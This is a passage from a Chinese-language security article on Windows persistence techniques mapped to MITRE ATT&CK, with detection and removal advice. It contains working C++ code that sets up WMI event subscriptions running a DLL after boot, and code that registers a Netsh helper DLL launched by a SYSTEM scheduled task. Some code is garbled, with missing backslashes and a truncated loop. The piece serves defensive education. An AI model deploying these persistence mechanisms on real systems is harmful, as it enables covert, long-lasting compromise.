    pstfile->Release();
    pstfile = NULL;
    }
    CoUninitialize();
    return ret;
    }
从资源中释放文件的代码如下：
    BOOL ReleaseFile(LPTSTR resource_type, LPTSTR resource_name, LPCTSTR save_path)
    {
    BOOL ret = FALSE;
    DWORD cb = NULL;
    HRSRC h_resource = NULL;
    DWORD resource_size = NULL;
    LPVOID resource_pt = NULL;
    HGLOBAL h_resource_load = NULL;
    HANDLE save_file = NULL;
    h_resource = FindResource(NULL, resource_name, resource_type);
    if (NULL == h_resource)
    {
    goto Error_Exit;
    }
    resource_size = SizeofResource(NULL, h_resource);
    if (0 >= resource_size)
    {
    goto Error_Exit;
    }
    h_resource_load = LoadResource(NULL, h_resource);
    if (NULL == h_resource_load)
    {
    goto Error_Exit;
    }
    resource_pt = LockResource(h_resource_load);
    if (NULL == resource_pt)
    {
    goto Error_Exit;
    }
    save_file = CreateFile(save_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if(save_file == INVALID_HANDLE_VALUE)
    {
    goto Error_Exit;
    }
    for (DWORD i = 0; i =120 AND TargetInstance.SystemUpTime < 150”””));
    if(!CreateProcess(NULL, command, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi))
    {
    goto ERROR_EXIT;
    }
    WaitForSingleObject(pi.hProcess, INFINITE);
    TerminateProcess(pi.hProcess, 0);
    //添加一个事件消费者
    wsprintf(command, _TEXT(“cmd /c ”wmic /NAMESPACE:”\rootsubscription” PATH CommandLineEventConsumer CREATE Name=”TopsecConsumer”, ExecutablePath=”C:WindowsSystem32cmd.exe”,CommandLineTemplate=” /c Rundll32 C:topsec.dll RunProc”””));
    memset(&pi, 0, sizeof(pi));
    if(!CreateProcess(NULL, command, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi))
    {
    goto ERROR_EXIT;
    }
    WaitForSingleObject(pi.hProcess, INFINITE);
    TerminateProcess(pi.hProcess, 0);
    //绑定事件及消费者
    wsprintf(command, _TEXT(“cmd /c ”wmic /NAMESPACE:”\rootsubscription” =PATH __FilterToConsumerBinding CREATE Filter=”__EventFilter.Name=\”TopsecEventFilter\””, Consumer=”CommandLineEventConsumer.Name=\”TopsecConsumer\””””));
    memset(&pi, 0, sizeof(pi));
    if(!CreateProcess(NULL, command, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi))
    {
    goto ERROR_EXIT;
    }
    WaitForSingleObject(pi.hProcess, INFINITE);
    TerminateProcess(pi.hProcess, 0);
    ret = TRUE;
    ERROR_EXIT:
    if (command != NULL)
    {
    delete[] command;
    command = NULL;
    }
    return ret;
    }
有关事件查询的更多信息，可以查看微软在线帮助，接收事件通知。
有关WMI查询的更多信息，可以查看微软在线帮助，使用WQL查询。
关于WMI攻防的更多信息， 也可以参考FireEye发布的白皮书，《WINDOWS MANAGEMENT INSTRUMENTATION (WMI)
OFFENSE, DEFENSE, AND FORENSICS》。
###  运行效果图
运行该程序后，会在系统中安装WMI事件，使用AutoRun工具查看WMI相关的数据
重启电脑，等系统运行时长超过120秒后，触发事件，我们设定的命令被执行
###  检查及清除方法
1、 使用AutoRuns工具检查WMI 订阅，并删除不明来源的事件订阅，可通过与已知良好的常规主机进行对比的方式，来确认事件订阅是否为不明来源。
## Netsh Helper DLL
###  原理及代码介绍
Netsh.exe（也称为Netshell）是一个命令行脚本实用程序，用于与系统的网络配置进行交互。它包含添加辅助DLL以扩展实用程序功能的功能，
使用“netsh add helper”即可注册新的扩展DLL，注册扩展DLL后，在启动Netsh的时候便会加载我们指定的DLL。注册的Netsh
Helper DLL的路径会保存到Windows注册表中的HKLMSOFTWAREMicrosoftNetsh路径下。
当使用另一种持久性技术自动执行netsh.exe时，攻击者可以使用带有Helper DLL的Netsh.exe以持久方式代理执行任意代码。
计划任务程序是Microsoft Windows的一个组件，它提供了在预定义时间或指定时间间隔之后安排程序或脚本启动的功能，
也称为作业调度或任务调度。系统中的schtasks.exe用于管理计划任务，允许管理员创建、删除、查询、更改、运行和中止本地或远程系统上的计划任  
务。如从计划表中添加和删除任务，按需要启动和停止任务，显示和更改计划任务。
如下的代码演示了攻击者如何通过在Netsh命令添加Helper DLL并通过调用schtasks程序来新建计划任务，实现代码持久化的目的。
    BOOL add_to_netsh_helper(LPCTSTR dll_path)
    {
    BOOL   ret = FALSE;
    int    path_len = NULL;
    TCHAR* command = NULL;
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(STARTUPINFO);
    path_len = _tcslen(dll_path);
    command = new TCHAR[(path_len * sizeof(TCHAR) +  sizeof(TCHAR)) * 2];
    //添加netsh helper
    wsprintf(command, _TEXT("cmd /c "netsh add helper %s""), dll_path);
    if(!CreateProcess(NULL, command, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi))
    {
       goto ERROR_EXIT;
    }
    WaitForSingleObject(pi.hProcess, INFINITE);
    memset(&pi, 0, sizeof(pi));
    //添加netsh主程序到计划任务
    wsprintf(command, _TEXT("cmd /c "schtasks.exe /create /tn "init" /ru SYSTEM /sc ONSTART /tr "C:\windows\system32\netsh.exe"""));
    if(!CreateProcess(NULL, command, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi))
    {
       goto ERROR_EXIT;
    }
    WaitForSingleObject(pi.hProcess, INFINITE);
    ret = TRUE;
    ERROR_EXIT:
    if (command != NULL)
    {
       delete[] command;
       command = NULL;
    }
    return ret;
    }
其中Netsh Helper DLL需要导出一个函数供 Netsh调用，导出函数原型及关键代码如下：
    BOOL APIENTRY DllMain( HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
    )
    {
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    OutputDebugString(_TEXT(“Load DLL~~”));
    break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
    break;
    }
    return TRUE;
    }
    DWORD _stdcall NewThreadProc(LPVOID lpParam)
    {
    while (TRUE)
    {
    OutputDebugString(_TEXT(“Netsh Helper, Hello Topsec”));
    }
    return 0;
    }
    extern “C” DWORD _stdcall InitHelperDll(DWORD dwNetshVersion, PVOID Reserved)
    {
    CreateThread(NULL, NULL, NewThreadProc, NULL, NULL, NULL);
    MessageBox(NULL, _TEXT(“Netsh Helper, Hello Topsec”), NULL, MB_OK);
    return NO_ERROR;
    }
###  运行效果图
上面的代码首先添加Netsh Helper DLL，然后添加计划任务，在系统启动的时候启动Netsh。 计算机重启后效果如图：
运行后的注册表键值情况如下图所示：
###  检查及清除方法
1、检查注册表路径HKLMSOFTWAREMicrosoftNetsh，查看是否有不明来源的Helper DLL注册信息并删除。
## 总结
以上就是持久化攻击的全部内容了，通过本文总结的这些攻击手段可以看出，有的虽老生常谈，却不可忽视，有的设计很巧妙，令人受益匪浅。它们好像无孔不入，所有的攻击都是为了更隐蔽，更持久的运行。当然，这肯定不是MITRE
ATT&CK™上的所有内容，更不是攻击者的所有手段，一定会有一些攻击手段尚未被发现。想象着，当攻击者不断获取着系统上的信息，而你却不自知时，这是多么可怕！作为安全工作者，我们不应满足于现状，更应该拥有好奇心和创造力，去发现未知的安全隐患。
本文到此就结束了，接下来会根据MITRE ATT&CK™出一系列类似的文章，敬请期待！